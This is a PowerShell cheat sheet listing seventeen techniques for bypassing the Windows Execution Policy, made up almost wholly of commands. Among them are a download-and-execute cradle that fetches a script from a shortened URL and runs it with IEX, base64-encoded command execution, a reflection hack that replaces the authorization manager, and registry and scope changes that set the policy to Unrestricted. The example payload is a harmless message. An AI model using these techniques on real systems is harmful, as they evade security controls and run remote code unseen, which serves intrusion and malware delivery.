### Bypassing the PowerShell Execution Policy
#############################################################################

#1 Execute the code from an Interactive PowerShell Console
Write-Host -Message "this is my evil script"

#2 Pipe the echoed script to PowerShell Standard In
Echo "Write-Host 'this is my evil script'"  | PowerShell.exe -noprofile 

#3 Read from file and pipe to PowerShell Standard In

#Example 1: 
Get-Content MyScript.ps1 | PowerShell.exe -noprofile 

#Example 2: 
TYPE MyScript.ps1 | PowerShell.exe -noprofile

#4 Download Script from URL and use IEX
powershell -nop -c "iex( New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')"

iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")

#5 Execute PowerShell with the command switch
Powershell.exe -nop -command "Write-Host 'this is my evil script'"

#6 Execute PowerShell with the enc switch
#Example 1: HowTo 
$command = "Write-Host 'this is my evil script'" 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand = [Convert]::ToBase64String($bytes) 
powershell.exe -EncodedCommand $encodedCommand

#Example 2: Execution
powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAdABoAGkAcwAgAGkAcwAgAG0AeQAgAGUAdgBpAGwAIABzAGMAcgBpAHAAdAAnAA==

#7 Use the Invoke-Command command
invoke-command -scriptblock {Write-Host 'this is my evil script'}

#can also be executed remotely
invoke-command -computername localhost -scriptblock {get-executionpolicy} | set-executionpolicy -force

#8 Use IEX
#Example 1: Get-Content
Get-Content MyScript.ps1 | Invoke-Expression

#Example 2: alias
GC MyScript.ps1 | iex

#9 Execute PowerShell.exe with the ExecutionPolicy switch to override the ExecutionPolicy -Bypass
PowerShell.exe -ExecutionPolicy Bypass -File MyScript.ps1

#10 Execute PowerShell.exe with the ExecutionPolicy switch to override the ExecutionPolicy -Unrestricted
PowerShell.exe -ExecutionPolicy UnRestricted -File MyScript.ps1

#11 Execute PowerShell.exe with the ExecutionPolicy switch to override the ExecutionPolicy - RemoteSigned
#First sign your script with a self created cert - makecert.exe
PowerShell.exe -ExecutionPolicy RemoteSigned -File .runme.ps1

#12 Change the execution context by resetting the authorization manager
$context = $executioncontext.GetType().GetField(
	'_context','nonpublic,instance').GetValue($executioncontext)
$field = $context.GetType().GetField(
	'_authorizationManager','nonpublic,instance')
$field.SetValue($context,
	(New-Object –TypeName Management.Automation.AuthorizationManager -ArgumentList Microsoft.PowerShell)) 
.\MyScript.ps1

#13 Set the ExcutionPolicy for the Process scope
Set-ExecutionPolicy Bypass -Scope Process

#14 Set the ExcutionPolicy for the CurrentUser scope via Command
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

#15 Set the ExcutionPolicy for the CurrentUser scope via the Registry
Computer\HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
ExecutionPolicy REG_SZ Unrestricted

#16 Create the following ps.cmd and put it in your PATH:
POWERSHELL -Command "$enccmd=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content '%1' | Out-String)));POWERSHELL -EncodedCommand $enccmd"

#17 Using a ScriptBlock
$scriptcontents = [scriptblock]::create((get-content '\\server\filepath.ps1'|out-string))
. $scriptcontents



